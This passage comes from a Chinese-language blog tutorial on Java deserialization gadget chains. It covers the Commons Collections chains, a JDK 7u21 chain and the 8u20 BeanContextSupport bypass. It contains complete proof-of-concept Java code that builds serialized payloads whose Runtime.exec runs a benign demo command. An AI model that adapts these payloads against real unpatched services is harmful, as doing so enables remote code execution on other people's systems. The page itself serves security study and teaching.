class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;"getRuntime",null&#125;),</span><br><span class="line">                new InvokerTransformer("invoke",new Class[]&#123;Object.class, Object[].class&#125;,new Object[]&#123;null,null&#125;),</span><br><span class="line">                new InvokerTransformer("exec",new Class[]&#123;String.class&#125;,new Object[]&#123;"open /Applications/IINA.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//先用一个假的chain占位置，稍后反射改回来</span></span><br><span class="line">        <span class="comment">//这里还是为了能够避开lazymap.put提前RCE</span></span><br><span class="line">        Transformer fakeChain = <span class="keyword">new</span> ChainedTransformer(fakeTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//LazyMap实例</span></span><br><span class="line">        Map innerMap1 = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map innerMap2 = <span class="keyword">new</span> HashMap();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建两个lazymap实例</span></span><br><span class="line">        Map lazyMap1 = LazyMap.decorate(innerMap1,fakeChain);</span><br><span class="line">        lazyMap1.put(<span class="string">"yy"</span>, <span class="number">1</span>);</span><br><span class="line">        Map lazyMap2 = LazyMap.decorate(innerMap2,fakeChain);</span><br><span class="line">        lazyMap2.put(<span class="string">"zZ"</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Hashtable hashTable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        hashTable.put(lazyMap1, <span class="string">"0range"</span>);</span><br><span class="line">        hashTable.put(lazyMap2, <span class="string">"0range"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反射设置真的 chain 数组</span></span><br><span class="line">        Field field = ChainedTransformer.class.getDeclaredField("iTransformers");</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        field.set(fakeChain, transformers_exec);</span><br><span class="line"></span><br><span class="line">        lazyMap2.remove(<span class="string">"yy"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc6_TemplatesImpl_HashTable.ser"</span>)));</span><br><span class="line">        fout.writeObject(hashTable);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc6_TemplatesImpl_HashTable.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为什么需要remove掉第二次的lazymap？</p><p>因为Hashtable的put方法里面也调用了equals方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517152132073.png" alt="image-20210517152132073"></p><p>会导致LazyMap2中右增加了(“yy“，”yy“)这个键值对，会影响当前lazymap2的size不再是1，而是2</p><p>导致在第二次进入的时候倒在了size的判断上。</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210517152618059.png" alt="image-20210517152618059"></p><p>当然既然还是扯到LazyMap，当然可以复用之前的InstantiateTransformer，</p><p>具体可以看我的<a href="https://github.com/0range228" target="_blank" rel="noopener">github</a>。</p><h2 id="CC链总结"><a href="#CC链总结" class="headerlink" title="CC链总结"></a>CC链总结</h2><p>五大反序列化利用基类：</p><blockquote><p>1.AnnotationInvocationHandler：反序列化的时候会循环调用成员变量的get方法，用来和lazyMap配合使用。</p><p>2.PriorityQueue：反序列化的时候会调用TransformingComparator中的transformer的transform方法，用来直接和Transformer配合使用。</p><p>3.BadAttributeValueExpException：反序列化的时候会去调用成员变量val的toString函数，用来和TiedMapEntry配合使用。（TiedMapEntry的toString函数会再去调自身的getValue）。</p><p>4.HashSet：反序列化的时候会去循环调用自身map中的put方法，用来和HashMap配合使用。</p><p>5.Hashtable：当里面包含2个及以上的map的时候，回去循环调用map的get方法，用来和LazyMap配合使用。</p></blockquote><p>四大Transformer的transform：</p><blockquote><p>1.ChainedTransformer：循环调用成员变量iTransformers数组中的tranform方法。    </p><p>2.InvokerTransformer： 通过反射的方法调用传入transform方法中的input对象的方法（方法通过成员变量iMethodName设置，参数通过成员变量iParamTypes设置）    </p><p>3.ConstantTransformer：返回成员变量iConstant的值。    </p><p>4.InstantiateTransformer：通过反射的方法返回传入参数input的实例。（构造函数的参数通过成员变量iArgs传入，参数类型通过成员变量iParamTypes传入）    </p></blockquote><p>三大Map：</p><blockquote><p>1.LazyMap：通过调用LazyMap的get方法可以触发它的成员变量factory的tranform方法，用来和上一节中的Tranformer配合使用。</p><p>2.TiedMapEntry：通过调用TiedMapEntry的getValue方法实现对他的成员变量map的get方法的调用，用来和LazyMap配合使用。</p><p>3.HashMap：通过调用HashMap的put方法实现对成员变量hashCode方法的调用，用来和TiedMapEntry配合使用（TiedMapEntry的hashCode函数会再去调自身的getValue）。</p></blockquote><h1 id="7u21"><a href="#7u21" class="headerlink" title="7u21"></a>7u21</h1><p>条件：</p><ul><li>jdk&lt;=7u21</li></ul><p>这是一条十分有个性的链，因为它仅依赖jre，不依赖任何第三方库。</p><p>先说个小tip：神奇的<code>f5a5a608</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(<span class="string">"f5a5a608"</span>.hashCode()); == <span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="利用链构造-1"><a href="#利用链构造-1" class="headerlink" title="利用链构造"></a>利用链构造</h2><p>用到了AnnotationInvocationHandler作为动态代理来触发cc2里面的TemplatesImpl携带恶意_bytecode，执行静态代码块加载。</p><p>前情回顾：</p><ul><li>TemplatesImpl 类可被序列化，并且其内部名为 _bytecodes 的成员可以用来存储某个 class 的字节数据</li><li>通过 TemplatesImpl 类的 getOutputProperties 方法 / newTransformer方法 ，可以最终导致 _bytecodes 所存储的字节数据被转换成为一个 Class（通过 ClassLoader.defineClass），并实例化此 Class，导致 Class 的构造方法/静态代码块中的代码被执行。</li></ul><p>光有链还是不够的，需要找个readObject的承接点，让这条链和反序列化入口点连接起来</p><p>7u21选择的入口点是LinkedHashSet的readObject方法，实际上是父类HashSet的readObject方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521093720662.png" alt="image-20210521093720662"></p><p>这里面的e就是反序列化后的对象。</p><p>为什么选择HashMap呢？是因为它有个神奇的equals方法</p><p>开启支线任务：</p><p>这里先进入AnnotationInvocationHandler的invoke方法看看：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521102440957.png" alt="image-20210521102440957"></p><p>这里如果调用的方法名称是equals，并且参数个数和类型匹配，就会进入equalsImpl方法</p><p>看一看equalsImpl方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521103501367.png" alt="image-20210521103501367"></p><p>到这里，梳理一下：</p><p>我们就在jdk里面找到了一个原生类AnnotationInvocationHandler，他可以充当动态代理，他的invoke方法会调用了本身的equalsImpl方法，在equalsImpl内部又会调用自身memberValues属性的get方法。</p><p>之前我们是将this.mamberValues赋值为LazyMap，但是现在我们需要找到一个jdk原生类。</p><p>发现下面还有一个invoke方法</p><p>ysoserial的思路肯定也是盯着哪些类有equals方法，我们的动态代理只要在之后去invoke这个equals方法就可以了。</p><p>世界线收束：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521110552890.png" alt="image-20210521110552890"></p><p>在我们之前发现的HashMap的put方法中，就会调用key的equals方法。</p><p>能到这里需要的条件：</p><ul><li>e.hash == hash</li><li>e.key == key</li></ul><p>首先会调用内部 <code>hash()</code> 函数计算 key 的 hash 值，然后遍历所有元素，*<em>当要插入的元素的 hash 和已有 entry 相同，且 key 和 Entry的 key 指向同一个对象 或 二者equals时 *</em>，则认为 key 是否已经存在，返回 oldValue，否则调用 <code>addEntry()</code> 添加元素。</p><p>这里核心关键点就是让key指向的是我们通过动态代理生成的Proxy对象，我们知道调用Proxy对象的任何方法，本质上都是在调用InvokcationHandler对象中被重写的invoke方法。因为生成Proxy对象时传入的参数是InvokcationHandler的子类AnnotationInvocationHandler，所以自然要调用AnnotationInvocationHandler.invoke()方法。</p><p>这里有几个细节：</p><ol><li>首先需要保证我们传入携带动态代理的key之前，map里面就已经有一个entry了，才能保证e不为null，进入循环</li><li>第一个entry应该为Templates对象</li><li>为了保证有有序添加，所以我们才用LinkedHashSet</li></ol><p>这里先看一下限制条件：</p><ol><li><p>e.hash == hash</p><p>这个需要保证的是两个hash值相等，hash值就是<code>hash()</code>值相等</p><p>想到我们之前的提到的神奇的<code>f5a5a608</code>，它的hashcode()==0</p></li></ol><p>看一下hash()源码：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521111553605.png" alt="image-20210521111553605"></p><p>这里其实结果只受k.hashcode()的影响。</p><ul><li>对于普通的obj来说，这里k就是本身</li><li>对于一个代理类来说，统一调用invoke方法。如果当前的k是AnnotationInvocationHandler类，那么调用的就是AnnotationInvocationHandler类内部的hashCodeImpl()方法</li></ul><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521112200882.png" alt="image-20210521112200882"></p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521112527126.png" alt="image-20210521112527126"></p><p>跟进memberValueHashCode方法再看看：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521112817611.png" alt="image-20210521112817611"></p><p>改写一下就是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">( <span class="number">127</span> * key.hashCode() ) ^ value.hashCode()</span><br></pre></td></tr></table></figure><p>两个hash：</p><ul><li>TemplatesImpl实例.hashCode()</li><li>( 127 * key.hashCode() ) ^ TemplatesImpl实例.hashCode()</li></ul><p>我们希望key就是<code>f5a5a608</code>，这样的话返回值就是TemplatesImpl实例.hashCode()了，就可以绕过<code>e.hash == hash</code>的check了。</p><p>细节：</p><ul><li>可以看到hashCodeImpl()内部是有一个循环的，为了让最后的结果和value.hashCode()相同，我们希望memberValues只有一个entry，再put一个相同的key就行了，为了让tmpl和第一次的一样。</li><li>我们这里只需要让memberValue这个属性里面存放一个HashMap就行了，这个map的key是<code>f5a5a608</code>，value是包含恶意字节码的TemplatesImpl对象就行了</li></ul><h2 id="最终PoC"><a href="#最终PoC" class="headerlink" title="最终PoC"></a>最终PoC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//1.先创建恶意类</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(AbstractTranslet<span class="class">.<span class="keyword">class</span>))</span>;</span><br><span class="line">        CtClass tempExploitClass = pool.makeClass(<span class="string">"3xpl01t"</span>);</span><br><span class="line">        <span class="comment">//一定要设置父类，为了后续顺利</span></span><br><span class="line">        tempExploitClass.setSuperclass(pool.get(AbstractTranslet<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>()))</span>;</span><br><span class="line">        <span class="comment">//写入payload，生成字节数组</span></span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"open /Applications/IINA.app\");"</span>;</span><br><span class="line">        tempExploitClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        <span class="keyword">byte</span>[] exploitBytes = tempExploitClass.toBytecode();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件</span></span><br><span class="line">        TemplatesImpl tmpl = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        <span class="comment">//设置_bytecodes属性为exploitBytes</span></span><br><span class="line">        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");</span><br><span class="line">        bytecodes.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        bytecodes.set(tmpl, <span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;exploitBytes&#125;);</span><br><span class="line">        <span class="comment">//一定要设置_name不为空</span></span><br><span class="line">        Field _name = TemplatesImpl.class.getDeclaredField("_name");</span><br><span class="line">        _name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _name.set(tmpl, <span class="string">"0range"</span>);</span><br><span class="line">        <span class="comment">//_class为空</span></span><br><span class="line">        Field _class = TemplatesImpl.class.getDeclaredField("_class");</span><br><span class="line">        _class.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        _class.set(tmpl, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//整个map,容量为2</span></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap(<span class="number">2</span>);</span><br><span class="line">        String magicStr = <span class="string">"f5a5a608"</span>;</span><br><span class="line">        <span class="comment">// 放入实际的 value</span></span><br><span class="line">        map.put(magicStr, tmpl);</span><br><span class="line"></span><br><span class="line">        Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor cons = clazz.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>,<span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler invocationHandler = (InvocationHandler) cons.newInstance(Templates<span class="class">.<span class="keyword">class</span>, <span class="title">map</span>)</span>;</span><br><span class="line"></span><br><span class="line">        Templates proxy = (Templates) Proxy.newProxyInstance(InvocationHandler.class.getClassLoader(), new Class[]&#123;Templates.class&#125;, invocationHandler);</span><br><span class="line"></span><br><span class="line">        HashSet target = <span class="keyword">new</span> LinkedHashSet();</span><br><span class="line">        target.add(tmpl);</span><br><span class="line">        target.add(proxy);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_jdk7u21.ser"</span>)));</span><br><span class="line">        fout.writeObject(target);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_jdk7u21.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="8u20"><a href="#8u20" class="headerlink" title="8u20"></a>8u20</h1><p>环境：</p><ul><li>jdk &lt;= 8u20</li></ul><p>在说8u20之前，说一下7u21的修复：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521143008667.png" alt="image-20210521143008667"></p><p>可以看到，AnnotationInvocationHandler的readObject方法把this.type属性限制了<code>只能是注解</code>，所以我们7u21用的是<code>Templates.class</code>，是为了后续的<code>TemplatesImpl</code>的instanceof的检查可以通过。</p><p>在8u20中使用<code>BeanContextSupport</code>类对这个修补方式进行了绕过。</p><h2 id="基础知识补充-序列化"><a href="#基础知识补充-序列化" class="headerlink" title="基础知识补充-序列化"></a>基础知识补充-序列化</h2><p>整个例子</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521160220634.png" alt="image-20210521160220634"></p><p>在ObjectOutputStream位置下个断点</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521155206766.png" alt="image-20210521155206766"></p><p>跟进去看，构造函数就做了很多事情，会来到writeStreamHeader方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521160415081.png" alt="image-20210521160415081"></p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521160518217.png" alt="image-20210521160518217"></p><p>写入了<code>aced0005</code></p><p>接下来看下<code>out.writeObject(object)</code>是怎么写入数据的？</p><p>会先解析class结构，判断是否实现了Serializable接口，是的话执行<code>writeOrdinaryObject</code>方法</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521160831777.png" alt="image-20210521160831777"></p><p>看下图，首先写入<code>TC_OBJECT,</code>常量<code>TC_OBJECT</code>的值是<code>(byte)0x73</code>，之后调用<code>writeClassDesc</code>方法写入类描述符，然后会调用到<code>writeNonProxyDesc</code>方法</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521164415007.png" alt="image-20210521164415007"></p><p>进入writeNonProxyDesc方法，</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521164739263.png" alt="image-20210521164739263"></p><p>写入<code>TC_CLASSDESC</code>的值是0x72，然后进入writeNonProxy方法</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521164704196.png" alt="image-20210521164704196"></p><p>跟进去看看<code>getSerialVersionID</code>是做什么的，看下图可以发现，默认获取对象的<code>serialVersionUID</code>值，如果对象<code>serialVersionUID</code>的值为空则会计算出一个<code>serialVersionUID</code>的值</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521165047244.png" alt="image-20210521165047244"></p><p>返回writeNonProxy方法看看之后做了什么事情：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521170116717.png" alt="image-20210521170116717"></p><p>回到writeNonProxyDesc方法</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521170318982.png" alt="image-20210521170318982"></p><p>可以看到在对当前对象的序列化之后，进行了对父类对象的序列化，写入父类的class结构信息。</p><p>到这里子类和父类的class都写完了。</p><p>接下来回到代码，接下来会进入writeSerialData写入对象的属性值。</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521170927503.png" alt="image-20210521170927503"></p><p>进入可以看到slots存放的是对象数组，先是父类，然后才是子类对象：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521171332673.png" alt="image-20210521171332673"></p><p>这里梳理一下流程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">序列化类结构信息： 子类 - &gt; 父类</span><br><span class="line">  </span><br><span class="line">序列化对象信息： 父类 - &gt; 子类</span><br></pre></td></tr></table></figure><h2 id="利用链构造-2"><a href="#利用链构造-2" class="headerlink" title="利用链构造"></a>利用链构造</h2><p>这里我们先看一下8u20下AnnotationInvocationHandler类的readObject方法</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521174334090.png" alt="image-20210521174334090"></p><p>两步骤：</p><ul><li>先执行var1.defaultReadObject()来还原对象，从流里还原对象</li><li>检查this.type进行了是否为注解类，如果不是的话就报错</li></ul><p>注意<strong>AnnotationInvocationHandler 这个对象是先被成功还原</strong>，然后再抛出的异常。绕过就是利用了这一点。</p><h3 id="什么是反序列化句柄handle"><a href="#什么是反序列化句柄handle" class="headerlink" title="什么是反序列化句柄handle"></a>什么是反序列化句柄handle</h3><p>handle值是每一个对象自身的一个字段。</p><p>如果你连续两次序列化同一个对象，那么第二次序列化写入的就是第一个对象的handle。</p><p>可以发现，因为我们两次 writeObject 写入的其实是同一个对象，所以 Date 对象的数据只在第一次 writeObject 的时候被真实写入了。而第二次 writeObject 时，写入的是一个 TC_REFERENCE 的结构，随后跟了一个4 字节的 Int 值，值为 0x00 7e 00 01。这是什么意思呢？意思就是第二个对象引用的其实是 handle 为 0x00 7e 00 01 的那个对象。</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521192832251.png" alt="image-20210521192832251"></p><p>在反序列化进行读取的时候，因为之前进行了两次 writeObject，所以为了读取，也应该进行两次 readObject：</p><ol><li>第一次 readObject 将会读取 TC_OBJECT 表示的第 1 个对象，发现是 Date 类型的对象，然后从流中读取此对象成员的值并还原。并为此 Date 对象分配一个值为 0x00 7e 00 01 的 handle。</li><li>第二个 readObject 会读取到 TC_REFERENCE，说明是一个引用，引用的是刚才还原出来的那个 Date 对象，此时将直接返回之前那个 Date 对象的引用。</li></ol><h3 id="反序列化与异常"><a href="#反序列化与异常" class="headerlink" title="反序列化与异常"></a>反序列化与异常</h3><p>如果一个类实现如下：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521191454663.png" alt="image-20210521191454663"></p><p>这个类的反序列化只能反序列化出来一个passcode属性为root的对象</p><p>如果该字段不是root，则会报错</p><p>那么如何来绕过这个字段的判断呢？</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521191917656.png" alt="image-20210521191917656"></p><p>这个类就可以，可以看到他在readObject函数里面，又一次使用了readObject方法来<strong>读取流中的下一个对象</strong></p><p>下一个对象如果不是root的话，会报异常，但是这个异常被catch住了，所以正常的反序列化流程还是可以执行完毕的。</p><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><p>JRE8u20 中利用到了名为 BeanContextSupport 类。</p><p>这个类就是负责来帮我们绕过的</p><p>看一下BeanContextSupport的readObject源码：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521194016263.png" alt="image-20210521194016263"></p><p>进入readChildren方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210521194127997.png" alt="image-20210521194127997"></p><p>发现这里读去了流中的下一个对象，符合构造条件</p><p>在执行<code>ois.readObject()</code>时,这里try-catch了,但是没有把异常抛出来,程序会接着执行。</p><p>如果这里可以把<code>AnnotationInvocationHandler</code>对象在<code>BeanContextSupport</code>类第二次writeObject的时候写入，这样反序列化时，即使<code>AnnotationInvocationHandler</code>对象 this.type的值为<code>Templates</code>类型也不会报错。</p><blockquote><p>反序列化还有两点就是:</p><p>1.反序列化时类中没有这个成员,依然会对这个成员进行反序列化操作,但是之后会抛弃掉这个成员。</p><p>2.每一个新的对象都会分配一个newHandle的值,newHandle生成规则是从0x7e0000开始递增,如果后面出现相同的类型则会使用<code>TC_REFERENCE</code>结构,引用前面handle的值。</p></blockquote><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.anquanke.com/post/id/201762" target="_blank" rel="noopener">lalajun</a>/<a href="https://www.anquanke.com/post/id/82934" target="_blank" rel="noopener">高级利用</a>/<a href="https://www.cnblogs.com/litlife/p/12571787.html#transformedmap" target="_blank" rel="noopener">lazymap</a>/<a href="https://xz.aliyun.com/t/3847#toc-8" target="_blank" rel="noopener">浅析Java序列化和反序列化</a>/</p><p><a href="https://www.guildhab.top/2020/08/java-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e8-%e8%a7%a3%e5%af%86-ysoserial-commonscollections2-pop-chains/" target="_blank" rel="noopener">javassist</a>/<a href="https://www.guildhab.top/2020/08/java-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e8-%e8%a7%a3%e5%af%86-ysoserial-commonscollections2-pop-chains/" target="_blank" rel="noopener">B4llo0n</a>/<a href="https://www.anquanke.com/post/id/232592" target="_blank" rel="noopener">anquanke</a>/<a 